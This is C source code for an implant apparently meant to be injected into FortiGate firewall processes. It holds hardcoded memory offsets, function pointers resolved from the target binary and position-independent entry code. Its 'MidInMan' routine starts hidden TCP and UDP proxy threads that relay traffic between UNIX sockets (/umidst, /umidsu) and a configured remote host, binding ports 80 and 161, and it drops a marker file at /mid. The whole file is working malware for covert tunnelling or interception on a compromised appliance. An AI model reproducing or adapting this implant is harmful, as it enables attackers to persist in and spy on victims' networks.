


#ifdef _WIN32
#include "winsock.h"
#include <Windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib,"ws2_32.lib")

#define _CRT_SECURE_NO_WARNINGS

#elif defined(__linux__)
#include <sys/un.h>
#include <sys/socket.h>		// 提供 socket(), bind() 等函数
#include <netinet/in.h>		// 提供 sockaddr_in 结构体
#include <arpa/inet.h>		// 提供 inet_pton(), inet_ntoa() 等函数 (可选)
#include <stdio.h>
#include <sys/socket.h>		// msghdr 定义在此
#include <sys/uio.h>		// struct iovec（msghdr 成员依赖）
#include <fcntl.h>			// open
#include <unistd.h>			// write, close
#include <errno.h>			// errno
#include <string.h>			// strerror
#include <stdlib.h>	
#include <pthread.h>
#else
#error "Unknown platform"
#endif





struct NetAddress {
	unsigned int dip;	//0
	int dport;			//4
	unsigned int mip;	//8
	int mport;			//12
	char* base;			//16
};


struct ProxyAddress {
	int fdc;				//0
	unsigned int cip;		//4
	int cport;				//8
	struct NetAddress* na;	//12
};



void printdata(char* data, int size) {
	for (int i = 0; i < size; i++) {
		printf("%02x ", (unsigned char)data[i]);
		if ((i + 1) % 16 == 0) {
			printf("\r\n");
		}
	}
}


void writefile(char* buf, int size) {
#ifdef _WIN32
	int ret = 0;
	const char* logfile = "log.txt";
	HANDLE hf = CreateFileA(logfile, GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf != INVALID_HANDLE_VALUE) {
		int fs = SetFilePointer(hf, 0, 0, FILE_END);
		DWORD cnt = 0;
		ret = WriteFile(hf, buf, size, &cnt, 0);
		CloseHandle(hf);
	}
#elif defined __linux__
	const char* logfile = "log.txt";
	int fd = open(logfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
	ssize_t bytes = write(fd, buf, size);
	close(fd);
#endif
}

#define SERVER_UDP_LISTEN_PORT		161
#define SERVER_TCP_LISTEN_PORT		80

//#define FORITGATE_PHYSICAL

#ifdef FORITGATE_PHYSICAL
#define THREAD_PARAM_ADDR		0x2670D70		//2671030 2c0
#define ENTRY_PROC_ADDR			0x2655680		//2655930  2b0
#define UDP_LISTENER_ADDR		0x26543F0		//2654C30	840
#define TCP_LISTENER_ADDR		0x465c00		//4666E0	ae0
#define TCP_PROXY_ADDR			TCP_LISTENER_ADDR + 0x400
#else
#define THREAD_PARAM_ADDR		0x448B80	//0x448D60	0x1e0
#define ENTRY_PROC_ADDR			0x1F45D20	//0x1F45F30	0x210

#define UDP_LISTENER_ADDR		0x4DC810	//0x4DCDE0	0x5d0

#define TCP_LISTENER_ADDR		0x4D31E0 	//0x4D35C0	0x3e0

#define TCP_PROXY_ADDR			0x2CAB810	//0x2CAc000	0x7f0

#endif


//gcc -static mid.cpp -lstdc++ -fno-stack-protector -o mid


#ifdef __linux__

typedef int (*ptrsocket)(int, int, int);
typedef int (*ptrconnect)(int, sockaddr*, int);
typedef int (*ptrbind)(int fd, const struct sockaddr* addr, socklen_t len);
typedef int (*ptrsend)(int, char*, int, int);
typedef int (*ptrrecv)(int, char*, int, int);
typedef int (*ptrlisten)(int fd, int n);
typedef int (*ptraccept)(int fd, struct sockaddr* addr, socklen_t* addr_len);
typedef int (*ptrclose)(int);
typedef unsigned short (*ptrntohs)(unsigned short);
typedef int (*ptrprintf)(const char* format, ...);
typedef void (*ptrperror)(const char* s);
typedef int (*ptrpthread_create)(pthread_t* newthread, const pthread_attr_t* attr, void* (*start_routine)(void*), void* arg);
typedef void* (*ptrmalloc)(size_t size);
typedef void* (*start_routine)(void*);
typedef void (*ptrfree)(void* ptr);
typedef ssize_t (*ptrrecvfrom)(int fd, void* buf, size_t n, int flags, struct sockaddr* addr, socklen_t* addr_len);
typedef ssize_t(*ptrsendto)(int fd, const void* buf, size_t n, int flags, const struct sockaddr* addr, socklen_t addr_len);
typedef int (*ptrsetsockopt)(int fd, int level, int optname, const void* optval, socklen_t optlen);
typedef int (*ptrselect)(int nfds, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, struct timeval* timeout);
typedef int (*ptrclose)(int fd);
typedef ssize_t(*ptrwrite)(int fd, const void* buf, size_t count);
typedef int (*ptropen)(const char* pathname, int flags, mode_t mode);
typedef int (*ptrsprintf)(char* s, const char* format, ...);
typedef int (* ptrunlink)(const char* name);



#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif
void* TcpProxyer(void* param) {

	ProxyAddress* pa = (ProxyAddress*)param;
	char* base = pa->na->base;

#ifdef FORITGATE_PHYSICAL
	ptrsocket lpsocket = *(ptrsocket*)(base + 0x4FEDDE8);
	ptrntohs lpntohs = *(ptrntohs*)(base + 0x4FEF818);
	ptrconnect lpconnect = *(ptrconnect*)(base + 0x4FEDBF8);
	ptrsend lpsend = *(ptrsend*)(base + 0x4FEFE50);
	ptrrecv lprecv = *(ptrrecv*)(base + 0x4FEC5F8);
	ptrbind lpbind = *(ptrbind*)(base + 0x4FEF158);
	//ptrlisten lplisten = *(ptrlisten*)(base + 0x4FEF8E0);
	//ptraccept lpaccept = *(ptraccept*)(base + 0x4FEED10);
	ptrclose lpclose = *(ptrclose*)(base + 0x4FED690);
	//ptrpthread_create lppthread_create = *(ptrpthread_create*)(base + 0x4FED390);
	//ptrprintf lpprintf = *(ptrprintf*)(base + 0x4FED1F0);
	//ptrperror lpperror = *(ptrperror*)(base + 0x4FED978);
	//ptrmalloc lpmalloc = *(ptrmalloc*)(base + 0x4FEF0C8);
	ptrfree lpfree = *(ptrfree*)(base + 0x4FED428);
	ptrsetsockopt lpsetsockopt = *(ptrsetsockopt*)(base + 0x4FED4A8);
	ptrselect lpselect = *(ptrselect*)(base + 0x4FED180);
#else
	//lpprintf("%s %d\r\n", __FUNCTION__, __LINE__);
	ptrsocket lpsocket = *(ptrsocket*)0x42957F0;
	ptrntohs lpntohs = *(ptrntohs*)0x4297100;
	ptrconnect lpconnect = *(ptrconnect*)0x4295618;
	ptrsend lpsend = *(ptrsend*)0x4295508;
	ptrrecv lprecv = *(ptrrecv*)0x42940D8;
	ptrbind lpbind = *(ptrbind*)0x4296A70;
	//ptrlisten lplisten = *(ptrlisten*)0x42971B8;
	//ptraccept lpaccept = *(ptraccept*)0x4296648;
	ptrclose lpclose = *(ptrclose*)0x42950F0;
	//ptrpthread_create lppthread_create = *(ptrpthread_create*)0x4294DF0;
	//ptrprintf lpprintf = *(ptrprintf*)0x4294C60;
	//ptrperror lpperror = *(ptrperror*)0x42953B8;
	//ptrmalloc lpmalloc = *(ptrmalloc*)0x42969F0;
	ptrfree lpfree = *(ptrfree*)0x4294E80;
	ptrsetsockopt lpsetsockopt = *(ptrsetsockopt*)0x4294F00;
	ptrselect lpselect = *(ptrselect*)0x4294BF8;
#endif

	int ret = 0;

	//lpprintf("%s %d proxy server:%x port:%d,remote server:%x,port:%d\r\n", __FUNCTION__, __LINE__,pa->na->mip, pa->na->mport,sa.sin_addr.s_addr, sa.sin_port);

	int fds = lpsocket(2, 1, 0);
	if (fds == -1 ) {
		lpclose(pa->fdc);
		lpfree(param);
		
		//perror("socket error\r\n");
		//printf("%s %d\r\n", strerror(errno));
		return 0;
	}

	sockaddr_in sc = { 0 };
	sc.sin_family = AF_INET;
	sc.sin_addr.s_addr = 0;
	sc.sin_port = lpntohs(SERVER_TCP_LISTEN_PORT);
	ret = lpbind(fds, (sockaddr*)&sc, sizeof(sockaddr_in));
	if (ret) {
		lpclose(pa->fdc);
		lpfree(param);
		return 0;
	}

	struct timeval tv;
	tv.tv_sec = 3;
	tv.tv_usec = 0;
	lpsetsockopt(fds, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
	lpsetsockopt(fds, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	lpsetsockopt(pa->fdc, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
	lpsetsockopt(pa->fdc, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = pa->na->dip;
	sa.sin_port = pa->na->dport;
	ret = lpconnect(fds, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret) {
		lpclose(fds);
		lpclose(pa->fdc);
		lpfree(param);
		//lpperror("connect error\r\n");
		return 0;
	}

	char recvbuf[0x1000];
	int recvBufSize = sizeof(recvbuf);
	int recvlen;
	int sendlen;
	while (1) {
		int max = (fds > pa->fdc) ? fds : pa->fdc;
		fd_set fdset;
		FD_ZERO(&fdset);
		FD_SET(fds, &fdset);
		FD_SET(pa->fdc, &fdset);

		ret = lpselect(max + 1, &fdset, 0, 0, 0);
		if (ret > 0) {
			if (FD_ISSET(fds, &fdset)) {
				recvlen = lprecv(fds, recvbuf, recvBufSize - 1, 0);
				if (recvlen > 0) {
					sendlen = lpsend(pa->fdc, recvbuf, recvlen, 0);
					if (sendlen <= 0) {
						break;
					}
				}
				else {
					break;
				}
			}
			else if (FD_ISSET(pa->fdc, &fdset)) {
				recvlen = lprecv(pa->fdc, recvbuf, recvBufSize - 1, 0);
				if (recvlen > 0) {
					sendlen = lpsend(fds, recvbuf, recvlen, 0);
					if (sendlen <= 0) {
						break;
					}
				}
				else {
					break;
				}
			}
		}
	}

	lpclose(pa->fdc);
	lpclose(fds);
	lpfree(param);
}



#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif
void* TcpProxyListener(void* param) {
	NetAddress* na = (NetAddress*)param;
	char* base = na->base;

#ifdef FORITGATE_PHYSICAL
	ptrsocket lpsocket = *(ptrsocket*)(base + 0x4FEDDE8);
	ptrntohs lpntohs = *(ptrntohs*)(base + 0x4FEF818);
	ptrconnect lpconnect = *(ptrconnect*)(base + 0x4FEDBF8);
	ptrsend lpsend = *(ptrsend*)(base + 0x4FEFE50);
	ptrrecv lprecv = *(ptrrecv*)(base + 0x4FEC5F8);
	ptrbind lpbind = *(ptrbind*)(base + 0x4FEF158);
	ptrlisten lplisten = *(ptrlisten*)(base + 0x4FEF8E0);
	ptraccept lpaccept = *(ptraccept*)(base + 0x4FEED10);
	ptrclose lpclose = *(ptrclose*)(base + 0x4FED690);
	ptrpthread_create lppthread_create = *(ptrpthread_create*)(base + 0x4FED390);
	//ptrprintf lpprintf = *(ptrprintf*)(base + 0x4FED1F0);
	//ptrperror lpperror = *(ptrperror*)(base + 0x4FED978);
	ptrmalloc lpmalloc = *(ptrmalloc*)(base + 0x4FEF0C8);
	ptrfree lpfree = *(ptrfree*)(base + 0x4FED428);
	ptrsetsockopt lpsetsockopt = *(ptrsetsockopt*)(base + 0x4FED4A8);
	ptrselect lpselect = *(ptrselect*)(base + 0x4FED180);
	ptrunlink lpunlink = *(ptrunlink*)(base + 0x4FEACB0);
#else
	ptrsocket lpsocket = *(ptrsocket*)0x42957F0;
	ptrntohs lpntohs = *(ptrntohs*)0x4297100;
	ptrconnect lpconnect = *(ptrconnect*)0x4295618;
	ptrsend lpsend = *(ptrsend*)0x4295508;
	ptrrecv lprecv = *(ptrrecv*)0x42940D8;
	ptrbind lpbind = *(ptrbind*)0x4296A70;
	ptrlisten lplisten = *(ptrlisten*)0x42971B8;
	ptraccept lpaccept = *(ptraccept*)0x4296648;
	ptrclose lpclose = *(ptrclose*)0x42950F0;
	ptrpthread_create lppthread_create = *(ptrpthread_create*)0x4294DF0;
	//ptrprintf lpprintf = *(ptrprintf*)0x4294C60;
	//ptrperror lpperror = *(ptrperror*)0x42953B8;
	ptrmalloc lpmalloc = *(ptrmalloc*)0x42969F0;
	ptrfree lpfree = *(ptrfree*)0x4294E80;
	ptrsetsockopt lpsetsockopt = *(ptrsetsockopt*)0x4294F00;
	ptrunlink lpunlink = *(ptrunlink*)0x4292828;
#endif
	//lpprintf("%s %d\r\n", __FUNCTION__, __LINE__);
	
	int ret = 0;

	//lpprintf("server:%x port:%d,remote server:%x,port:%d\r\n", pa.sin_addr.s_addr, pa.sin_port,na->dip, na->dport);

	int sl = lpsocket(AF_UNIX, SOCK_STREAM, 0);
	if (sl == -1) {
		//lpperror("socket error\r\n");
		//lpprintf("%s %d\r\n", strerror(errno));
		return 0;
	}

	//sockaddr_in sa = { 0 };
	//sa.sin_family = AF_INET;
	//sa.sin_addr.s_addr = na->mip;
	//sa.sin_port = na->mport;

	struct sockaddr_un sa;
	sa.sun_family = AF_UNIX;
	sa.sun_path[0] = '/';
	sa.sun_path[1] = 'u';
	sa.sun_path[2] = 'm';
	sa.sun_path[3] = 'i';
	sa.sun_path[4] = 'd';
	sa.sun_path[5] = 's';
	sa.sun_path[6] = 't';
	sa.sun_path[7] = 0;
	lpunlink((const char*)  sa.sun_path);
	//strcpy(sa.sun_path, usname);
	ret = lpbind(sl, (sockaddr*)&sa, sizeof(struct sockaddr_un));
	if(ret){
		//perror("bind error\r\n");
		return 0;
	}

	ret = lplisten(sl, 16);

	while (1) {
		sockaddr_in ca;
		socklen_t casize = sizeof(sockaddr_in);
		int fdc = lpaccept(sl, (sockaddr*)&ca, &casize);
		if (fdc == -1) {
			break;
		}
		else {
			ProxyAddress * pa = (ProxyAddress *) lpmalloc(sizeof(ProxyAddress));
			pa->fdc = fdc;
			pa->cip = ca.sin_addr.s_addr;
			pa->cport = ca.sin_port;
			pa->na = na;
			unsigned long stid;
			start_routine proxyer = (start_routine)(base + TCP_PROXY_ADDR);
			lppthread_create(&stid, NULL, proxyer, (void*)pa);
		}
	}

	lpclose(sl);
}





#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif
void* UdpProxyListener(void* param) {
	NetAddress* na = (NetAddress*)param;
	char* base = na->base;

	//lpprintf("%s %d\r\n", __FUNCTION__, __LINE__);
#ifdef FORITGATE_PHYSICAL
	ptrsocket lpsocket = *(ptrsocket*)(base + 0x4FEDDE8);
	ptrntohs lpntohs = *(ptrntohs*)(base + 0x4FEF818);
	//ptrconnect lpconnect = *(ptrconnect*)(base + 0x4FEDBF8);
	//ptrsend lpsend = *(ptrsend*)(base + 0x4FEFE50);
	//ptrrecv lprecv = *(ptrrecv*)(base + 0x4FEC5F8);
	ptrbind lpbind = *(ptrbind*)(base + 0x4FEF158);
	//ptrlisten lplisten = *(ptrlisten*)(base + 0x4FEF8E0);
	//ptraccept lpaccept = *(ptraccept*)(base + 0x4FEED10);
	ptrclose lpclose = *(ptrclose*)(base + 0x4FED690);
	//ptrpthread_create lppthread_create = *(ptrpthread_create*)(base + 0x4FED390);
	//ptrprintf lpprintf = *(ptrprintf*)(base + 0x4FED1F0);
	//ptrperror lpperror = *(ptrperror*)(base + 0x4FED978);
	//ptrmalloc lpmalloc = *(ptrmalloc*)(base + 0x4FEF0C8);
	//ptrfree lpfree = *(ptrfree*)(base + 0x4FED428);
	ptrrecvfrom lprecvfrom = *(ptrrecvfrom*)(base + 0x4FED840);
	ptrsendto lpsendto = *(ptrsendto*)(base + 0x4FEBD70);
	ptrsetsockopt lpsetsockopt = *(ptrsetsockopt*)(base + 0x4FED4A8);
	ptrunlink lpunlink = *(ptrunlink*)(base + 0x4FEACB0);
	ptrselect lpselect = *(ptrselect*)(base + 0x4FED180);
#else
	ptrsocket lpsocket = *(ptrsocket*)0x42957F0;
	ptrntohs lpntohs = *(ptrntohs*)0x4297100;
	//ptrconnect lpconnect = *(ptrconnect*)0x4295618;
	//ptrsend lpsend = *(ptrsend*)0x4295508;
	//ptrrecv lprecv = *(ptrrecv*)0x42940D8;
	ptrbind lpbind = *(ptrbind*)0x4296A70;
	//ptrlisten lplisten = *(ptrlisten*)0x42971B8;
	//ptraccept lpaccept = *(ptraccept*)0x4296648;
	ptrclose lpclose = *(ptrclose*)0x42950F0;
	//ptrpthread_create lppthread_create = *(ptrpthread_create*)0x4294DF0;
	//ptrprintf lpprintf = *(ptrprintf*)0x4294C60;
	//ptrperror lpperror = *(ptrperror*)0x42953B8;
	//ptrmalloc lpmalloc = *(ptrmalloc*)0x42969F0;
	//ptrfree lpfree = *(ptrfree*)0x4294E80;
	ptrrecvfrom lprecvfrom = *(ptrrecvfrom*)0x4295298;
	ptrsendto lpsendto = *(ptrsendto*)0x42938B8;
	ptrsetsockopt lpsetsockopt = *(ptrsetsockopt*)0x4294F00;
	ptrunlink lpunlink = *(ptrunlink*)0x4292828;
	ptrselect lpselect = *(ptrselect*)0x4294BF8;
#endif

	int ret = 0;

	//lpprintf("server:%x port:%d,remote server:%x,port:%d\r\n", pa.sin_addr.s_addr, pa.sin_port,na->dip, na->dport);

	int ss = lpsocket(AF_UNIX, 2, 0);
	if (ss == -1) {
		//lpperror("socket error\r\n");
		//lpprintf("%s %d\r\n", strerror(errno));
		return 0;
	}

	int sc = lpsocket(2, 2, 0);
	if (sc == -1) {
		return 0;
	}

	struct timeval tv;
	tv.tv_sec = 3;
	tv.tv_usec = 0;
	lpsetsockopt(ss, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
	lpsetsockopt(ss, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	lpsetsockopt(sc, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
	lpsetsockopt(sc, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

	sockaddr_in sca = { 0 };
	sca.sin_family = AF_INET;
	sca.sin_addr.s_addr = 0;
	sca.sin_port = lpntohs(SERVER_UDP_LISTEN_PORT);
	ret = lpbind(sc, (sockaddr*)&sca, sizeof(sockaddr_in));
	if (ret) {
		//perror("bind error\r\n");
		return 0;
	}
	
	struct sockaddr_un ssa;
	ssa.sun_family = AF_UNIX;
	ssa.sun_path[0] = '/';
	ssa.sun_path[1] = 'u';
	ssa.sun_path[2] = 'm';
	ssa.sun_path[3] = 'i';
	ssa.sun_path[4] = 'd';
	ssa.sun_path[5] = 's';
	ssa.sun_path[6] = 'u';
	ssa.sun_path[7] = 0;
	lpunlink((const char*)ssa.sun_path);

	ret = lpbind(ss, (sockaddr*)&ssa, sizeof(sockaddr_un));
	if (ret) {
		//perror("bind error\r\n");
		return 0;
	}

	char recvbuf[0x1000];
	int recvBufSize = sizeof(recvbuf);
	fd_set readfds;
	int recvlen;
	int sendlen;
	sockaddr_un srcaddr;
	sockaddr_in dstaddr;
	while (1) {
		
		FD_ZERO(&readfds);
		FD_SET(ss, &readfds);
		FD_SET(sc, &readfds);
		int max_fd = ss > sc ? ss : sc;
		ret = lpselect(max_fd + 1, &readfds, NULL, NULL, NULL);
		if (ret > 0) {		
			if (FD_ISSET(ss, &readfds)) {	
				socklen_t addrsize = sizeof(sockaddr_un);
				recvlen = lprecvfrom(ss, recvbuf, recvBufSize - 1, 0, (sockaddr*)&srcaddr, &addrsize);
				if (recvlen > 0) {		
					dstaddr.sin_family = AF_INET;
					dstaddr.sin_addr.s_addr = na->dip;
					dstaddr.sin_port = na->dport;
					sendlen = lpsendto(sc, recvbuf, recvlen, 0, (sockaddr*)&dstaddr, sizeof(sockaddr_in));
					if (sendlen <= 0) {
						break;
					}
				}
				else {
					break;
				}
			}
			else if (FD_ISSET(sc, &readfds)) {
				socklen_t addrsize = sizeof(sockaddr_in);
				recvlen = lprecvfrom(sc, recvbuf, recvBufSize - 1, 0, (sockaddr*)&dstaddr, &addrsize);
				if (recvlen > 0) {
					sendlen = lpsendto(ss, recvbuf, recvlen, 0, (sockaddr*)&srcaddr, sizeof(sockaddr_un));
					if (sendlen <= 0) {
						break;
					}
				}
				else {
					break;
				}
			}
		}
	}

	lpclose(sc);
	lpclose(ss);
}



#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif
//#define ENTRY_PROC_ADDR			0X44A740	//44A920	0x1e0
void MidInMan() {

	char* regrip = 0;
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
	char** baseptr = (char**) (((unsigned long long)regrip & 0xffffffffffc0) + 0x200 );
	char* base = *baseptr;

	NetAddress* na = (NetAddress*)(base + THREAD_PARAM_ADDR);

#ifdef FORITGATE_PHYSICAL
	ptrpthread_create lppthread_create = *(ptrpthread_create*)(base + 0x4FED390);
	ptrwrite lpwrite = *(ptrwrite*)(base + 0x4FEF468);
	ptropen lpopen = *(ptropen*)(base + 0x4FEDDD8);
	ptrclose lpclose = *(ptrclose*)(base + 0x4FED690);
	ptrsprintf lpsprintf = *(ptrsprintf*)(base + 0x4FEC800);
#else
	ptrpthread_create lppthread_create = *(ptrpthread_create*)0x4294DF0;
	ptrwrite lpwrite = *(ptrwrite*)(0x4296D60);
	ptropen lpopen = *(ptropen*)(0x42957E0);
	ptrclose lpclose = *(ptrclose*)(0x42950F0);
	ptrsprintf lpsprintf = *(ptrsprintf*)0x42942B0;
	base = 0;
	na = (NetAddress*)(0 + THREAD_PARAM_ADDR);
#endif

	unsigned long ttid;
	start_routine tproxyer = (start_routine)(base + TCP_LISTENER_ADDR);
	
	lppthread_create(&ttid, NULL, tproxyer, (void*)na);

	unsigned long utid;
	start_routine uproxyer = (start_routine)(base + UDP_LISTENER_ADDR);

	lppthread_create(&utid, NULL, uproxyer, (void*)na);
	
	char filename[256];
	filename[0] = '/';
	filename[1] = 'm';
	filename[2] = 'i';
	filename[3] = 'd';
	filename[4] = 0;
	int fd = lpopen(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
	char buf[1024];
	ssize_t bytes_written = lpwrite(fd, filename, 4);
	lpclose(fd);
}

#endif



#ifdef __linux__
#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif
int testunix() {

	char* regrip = 0;
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
	unsigned long long* base = (unsigned long long*) (((unsigned long long)regrip & 0xffffffffff00) + 0x100);

	printf("%s address:%p\r\n", __FUNCTION__, base);

	printf("%s %d\r\n", __FUNCTION__, __LINE__);

	return 0;

	int ret = 0;

	//lpprintf("proxy server:%x port:%d,remote server:%x,port:%d\r\n", pa.sin_addr.s_addr, pa.sin_port,na->dip, na->dport);

	int sl = socket(AF_UNIX, SOCK_STREAM, 0);
	if (sl == -1) {
		perror("socket error\r\n");
		printf("%s\r\n", strerror(errno));
		return 0;
	}

	//NetAddress* na = (NetAddress*)param;
	//sockaddr_in sa = { 0 };
	//sa.sin_family = AF_INET;
	//sa.sin_addr.s_addr = na->mip;
	//sa.sin_port = na->mport;

	struct sockaddr_un sa;
	sa.sun_family = AF_UNIX;
	sa.sun_path[0] = '/';
	sa.sun_path[1] = 'u';
	sa.sun_path[2] = 'm';
	sa.sun_path[3] = 'i';
	sa.sun_path[4] = 'd';
	sa.sun_path[5] = 's';
	sa.sun_path[6] = 0;
	unlink((const char*)sa.sun_path);
	//strcpy(sa.sun_path, usname);
	ret = bind(sl, (sockaddr*)&sa, sizeof(struct sockaddr_un));
	if (ret) {
		perror("bind error\r\n");
		return 0;
	}

	ret = listen(sl, 16);

	while (1) {
		sockaddr_in ca;
		socklen_t casize = sizeof(sockaddr_in);
		int fdc = accept(sl, (sockaddr*)&ca, &casize);
		if (fdc == -1) {
			break;
		}
		else {
			char recvbuf[0x1000];
			int recvlen = recv(fdc, recvbuf, sizeof(recvbuf), 0);
			if (recvlen > 0) {
				recvbuf[recvlen] = 0;
				printf("recv data size:%d,data:%s\r\n", recvlen, recvbuf);
				
				char sendbuf[0x1000];
				sprintf(sendbuf,"remote handle:%x\r\n",  fdc);
				send(fdc, sendbuf, strlen(sendbuf), 0);

				close(fdc);
			}
		}
	}
}
#endif



int main(int argc, char** argv) {

	int ret = 0;

#ifdef _WIN32
	WSADATA wsa = { 0 };
	ret = WSAStartup(0x0202, &wsa);
	if (ret) {
		return -1;
	}
#endif

	int port = 0;
	char* server = 0;
	int seq = 0;
	for (seq = 0; seq < argc; seq++) {
		char* item = argv[seq];
		if (strcmp(item, "--p") == 0) {
			port = atoi(argv[seq + 1]);
			seq++;
		}
		else if (strcmp(item, "--s") == 0) {
			port = atoi(argv[seq + 1]);
			server = argv[seq + 1];
			seq++;
		}
		else if (strcmp(item, "-test") == 0) {
#ifdef __linux__
			testunix();
#endif
			break;
		}
		else {
			
		}
	}

	printf("%s %d\r\n", __FUNCTION__, __LINE__);
	return 0;
}


